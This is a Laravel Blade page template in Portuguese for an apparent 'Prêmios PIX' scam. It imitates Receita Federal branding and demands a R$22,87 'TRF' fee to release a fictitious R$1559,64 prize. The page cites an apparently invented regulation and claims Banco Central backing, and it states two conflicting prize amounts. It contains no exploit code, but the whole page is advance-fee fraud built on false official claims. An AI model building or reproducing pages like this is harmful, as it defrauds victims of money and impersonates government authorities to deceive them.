<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Pagar TRF – Prêmios PIX</title>
    @vite(['resources/css/app.css','resources/js/app.js'])
</head>
<body class="bg-gray-100 font-sans pt-8">

<div class="max-w-lg mx-auto">

    {{-- LOGO RECEITA --}}
    <div class="mb-6 flex items-center"
    style="    width: 100%;
    background-color: #002C5F;
    padding: 0.8rem 1rem;
    display: flex;
    align-items: center;
    justify-content: center;">
        <svg xmlns="http://www.w3.org/2000/svg" width="160" height="37" viewBox="0 0 160 37" fill="none"><path d="M21.1241 10.7151C21.1241 8.57211 24.1418 6.77896 27.9031 6.77896C31.6643 6.77896 34.682 8.52837 34.682 10.7151C34.682 12.8582 31.6643 14.6076 27.9031 14.6076C24.1418 14.6076 21.1241 12.8582 21.1241 10.7151ZM16.182 10.6277C23.9669 15.1761 33.7636 22.6111 38.7494 26.7222L27.9468 37C20.9054 30.1773 15.0887 24.7979 10.6277 20.9492C13.2518 15.7447 15.1761 12.2459 16.182 10.6277ZM16.0508 4.19858C19.8121 4.19858 23.792 4.37352 27.9468 4.67967C21.0804 7.6974 13.7329 11.7648 5.86052 16.9693C3.7175 15.2199 1.74941 13.8203 0 12.6395C5.81679 9.1844 11.1525 6.38535 16.0508 4.19858ZM40.5863 4.50473L39.7116 10.6277C33.9823 7.12884 27.8156 4.32979 21.1679 2.14303C24.3168 1.04965 26.5473 0.349882 27.9031 0C31.708 0.962175 35.9066 2.49291 40.5863 4.50473ZM27.9468 18.4125C34.4196 13.7329 40.2802 9.9279 46.1844 7.21631C48.8523 8.52837 52.0887 10.3215 55.8499 12.5957C52.0887 15.2199 48.2837 18.1939 44.4787 21.5615C39.2305 20.3369 32.9764 19.156 27.9468 18.4125Z" fill="white"></path><path d="M58.5178 24.9289H61.4481V19.8993C62.4977 19.8993 62.8913 19.8993 63.3724 21.605L64.3346 24.9289H67.3961L66.1277 20.8615C65.6467 19.3745 65.2968 18.8934 64.3783 18.7622C66.7838 18.2374 66.8712 16.1819 66.8712 15.657C66.8712 13.3391 65.1218 12.4644 63.0663 12.4644H58.5178V24.9289ZM61.3169 14.5636H62.1916C63.766 14.5636 63.941 15.6133 63.941 16.1381C63.941 17.0128 63.3724 17.8001 62.2353 17.8001H61.3169V14.5636ZM81.9162 22.9608C81.4351 23.1358 80.954 23.092 80.3854 23.092C79.3795 23.092 78.2424 22.5235 78.2424 20.6866C78.2424 20.3367 78.2424 18.1499 80.2542 18.1499C80.8228 18.1499 81.2164 18.1499 81.785 18.2374L81.9162 16.2693C81.0415 16.1818 80.6916 16.1381 79.8169 16.1381C77.0616 16.1381 75.5308 18.0187 75.5308 20.6866C75.5308 22.261 76.2743 25.0601 79.5982 25.0601C80.4292 25.0601 81.2164 25.1476 81.9599 24.9289L81.9162 22.9608ZM90.3571 14.7823H92.9812V12.4644H90.3571V14.7823ZM134.486 12.4644H131.862V17.5376C131.512 16.7504 130.812 16.1381 129.588 16.1381C127.401 16.1381 126.526 18.0625 126.526 20.3804C126.526 23.1358 127.619 25.0601 129.588 25.0601C131.075 25.0601 131.687 24.0979 131.949 23.5294C131.993 24.1417 132.037 24.579 132.037 24.9289H134.53C134.486 24.5353 134.486 24.0979 134.486 23.0045V12.4644ZM129.325 20.5991C129.325 19.2433 129.413 17.9313 130.593 17.9313C131.643 17.9313 131.906 19.2433 131.906 20.5991C131.906 21.605 131.687 23.1795 130.593 23.1795C129.369 23.1795 129.325 21.5176 129.325 20.5991ZM143.408 24.9289H146.032V21.0802C146.032 19.8119 146.207 18.4998 147.738 18.4998H148.612V16.3131H148.219C146.688 16.3131 146.338 16.9254 145.813 17.8875C145.77 17.3627 145.726 16.8379 145.726 16.3131H143.32C143.364 16.7504 143.364 17.2752 143.364 18.1062V24.9289H143.408ZM157.01 24.9289H159.634V12.4644H157.01V24.9289ZM111.437 24.9289H114.237V19.7244H118.173V17.5376H114.237V14.6511H118.304V12.4644H111.394V24.9289H111.437ZM149.312 18.4561C150.362 18.0187 151.149 17.9313 151.805 17.9313C152.199 17.9313 153.423 17.8438 153.423 19.5057H152.636C151.718 19.5057 148.35 19.5057 148.35 22.436C148.35 24.0105 149.4 25.0601 151.018 25.0601C152.242 25.0601 153.292 24.2729 153.38 23.748L153.467 24.9289H155.872C155.829 24.3603 155.829 23.748 155.829 22.4797V19.3308C155.829 17.4064 155.129 16.1381 152.067 16.1381C151.105 16.1381 150.187 16.2693 149.312 16.2693V18.4561ZM153.423 21.2551C153.423 23.3544 152.111 23.3982 151.849 23.3982C151.63 23.3982 150.712 23.3982 150.712 22.2611C150.712 20.8178 152.374 20.7303 153.423 20.7303V21.2551ZM69.8452 19.8556C69.8452 19.3745 69.8452 17.7126 71.201 17.7126C72.2944 17.7126 72.5568 18.7622 72.5568 19.8556H69.8452ZM74.9185 20.6428C74.9185 16.1381 71.9445 16.1381 71.1573 16.1381C68.6644 16.1381 67.3086 18.2374 67.3086 20.5554C67.3086 23.1795 68.6644 25.0601 71.6821 25.0601C72.5568 25.0601 73.5627 25.1038 74.4374 24.9289L74.3937 22.9608C73.519 23.267 72.863 23.267 71.9445 23.267C70.4575 23.267 69.8015 22.3048 69.8015 21.2989H74.9185V20.6428ZM84.5403 19.8556C84.5403 19.3745 84.5403 17.7126 85.8961 17.7126C86.9895 17.7126 87.2519 18.7622 87.2519 19.8556H84.5403ZM89.6136 20.6428C89.6136 16.1381 86.6396 16.1381 85.8523 16.1381C83.3594 16.1381 82.0036 18.2374 82.0036 20.5554C82.0036 23.1795 83.3594 25.0601 86.3772 25.0601C87.2956 25.0601 88.2578 25.1038 89.1325 24.9289L89.0888 22.9608C88.214 23.267 87.558 23.267 86.6396 23.267C85.1526 23.267 84.4966 22.3048 84.4966 21.2989H89.6136V20.6428ZM120.928 19.8556C120.928 19.3745 120.928 17.7126 122.284 17.7126C123.377 17.7126 123.64 18.7622 123.64 19.8556H120.928ZM126.045 20.6428C126.045 16.1381 123.071 16.1381 122.284 16.1381C119.791 16.1381 118.435 18.2374 118.435 20.5554C118.435 23.1795 119.791 25.0601 122.809 25.0601C123.683 25.0601 124.689 25.1038 125.564 24.9289L125.52 22.9608C124.645 23.267 123.989 23.267 123.071 23.267C121.584 23.267 120.928 22.3048 120.928 21.2989H126.045V20.6428ZM137.635 19.8556C137.635 19.3745 137.635 17.7126 138.991 17.7126C140.084 17.7126 140.346 18.7622 140.346 19.8556H137.635ZM142.752 20.6428C142.752 16.1381 139.778 16.1381 138.991 16.1381C136.498 16.1381 135.142 18.2374 135.142 20.5554C135.142 23.1795 136.498 25.0601 139.515 25.0601C140.434 25.0601 141.396 25.1038 142.271 24.9289L142.227 22.9608C141.352 23.267 140.696 23.267 139.778 23.267C138.291 23.267 137.635 22.3048 137.635 21.2989H142.752V20.6428ZM100.547 18.4561C101.597 18.0187 102.384 17.9313 103.04 17.9313C103.434 17.9313 104.658 17.8438 104.658 19.5057H103.871C102.953 19.5057 99.5852 19.5057 99.5852 22.436C99.5852 24.0105 100.635 25.0601 102.253 25.0601C103.521 25.0601 104.527 24.2729 104.615 23.748L104.702 24.9289H107.108C107.064 24.3603 107.02 23.748 107.02 22.4797V19.3308C107.02 17.4064 106.32 16.1381 103.303 16.1381C102.341 16.1381 101.422 16.2693 100.547 16.2693V18.4561ZM104.658 21.2551C104.658 23.3544 103.346 23.3982 103.084 23.3982C102.865 23.3982 101.947 23.3982 101.947 22.2611C101.947 20.8178 103.609 20.7303 104.615 20.7303V21.2551H104.658ZM90.3571 24.9289V16.2693H94.9055V14.4762L97.4859 13.6452V16.2256H99.1916V18.0625H97.4859V22.0424C97.4859 22.8733 97.8795 23.1358 98.3606 23.1358C98.7105 23.1358 98.9729 23.0483 99.2353 22.9608V24.8852C98.9729 24.9726 98.2731 25.0164 97.3984 25.0164C96.0427 25.0164 94.8618 24.3603 94.8618 22.4797V18.1062H93.0249V24.9289H90.3571Z" fill="white"></path></svg>
    </div>

    {{-- CARD PRINCIPAL --}}
    <div class="bg-white rounded-xl shadow-lg p-6 space-y-4">

        {{-- aviso TRF --}}
        <div class="bg-yellow-100 border-l-4 border-yellow-400 p-4">
            <span class="font-medium">Tarifa de Regularização Financeira (TRF)</span>
        </div>

        {{-- título e descrição --}}
        <h1 class="text-lg font-semibold">
            Pagamento Obrigatório para Liberação do Saldo Acumulado
        </h1>
        <p class="text-gray-700">
            Para liberar o valor acumulado de <strong>R$1559,64</strong>, é necessário o pagamento da TRF no valor de <strong>R$22,87</strong>.
        </p>
        <p class="text-gray-600 text-sm">
            * Antes da liberação, é necessário o recolhimento da TRF — Taxa de Regularização Financeira — conforme portaria N.º 177/21 do SFN (Sistema Financeiro Nacional).
        </p>

        {{-- resumo --}}
        <div class="border border-gray-200 rounded-lg p-4 space-y-2">
            <h2 class="font-medium">Resumo</h2>
            <div class="flex justify-between">
                <span>Valor ganho</span>
                <span><strong>R$1559,64</strong></span>
            </div>
            <div class="flex justify-between">
                <span>Valor a ser pago (TRF)</span>
                <span class="text-red-600">- R$22,87</span>
            </div>
            <p class="text-red-500 text-xs italic">
                *Reembolsado após Aprovação da Conta e Liberação do Saque
            </p>
            <div class="border-t border-gray-200 pt-2 flex justify-between">
                <span>Total a receber no PIX</span>
                <span><strong>R$1559,64</strong></span>

            </div>
            <p class="text-sm text-gray-500">❗O pagamento de R$1559,64 será processado via PIX imediatamente após a confirmação.</p>
        </div>

        {{-- botão principal --}}
        <button onclick="window.location.href='{{ route('home') }}'"
                class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-semibold">
            Pagar Imposto e Liberar Valor
        </button>

    </div>

    {{-- garantia --}}
    <div class="mt-6 bg-white rounded-xl shadow-lg p-4 space-y-4">
        <div>
            <h3 class="font-medium mb-2">Garantia de recebimento</h3>
            <div class="flex items-start gap-2">
                {{-- ícone de check --}}
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
                </svg>
                <p class="text-gray-700 text-sm">
                    Este processo é regulamentado pelo Banco Central do Brasil. Garantimos que o valor total de R$695,63 será creditado diretamente no seu PIX após o pagamento.
                </p>
            </div>
        </div>

        <div>
            <h3 class="font-medium mb-2">Método de pagamento</h3>
            <div class="flex items-start gap-2">
                <img src="https://premiospixes2025.online/dv/iof/images/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%252C_2020%29.svg.png"
                     class="h-16" alt="PIX">
                <p class="text-gray-700 text-sm">
                    Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.
                </p>
            </div>
        </div>
    </div>

    {{-- FAQ --}}
    <div class="mt-6 bg-white rounded-xl shadow-lg p-4">
        <h3 class="font-medium mb-3">Dúvidas Frequentes</h3>
        <div class="space-y-2">

            <button class="w-full flex justify-between items-center p-3 border border-gray-200 rounded-lg">
                <span class="text-gray-700">Por que o TRF de R$22,87 não é descontado do saldo acumulado de R$695,63?</span>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
                </svg>
            </button>

            <button class="w-full flex justify-between items-center p-3 border border-gray-200 rounded-lg">
                <span class="text-gray-700">Como realizar o pagamento do TRF?</span>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
                </svg>
            </button>

        </div>
    </div>

</div>

</body>
</html>
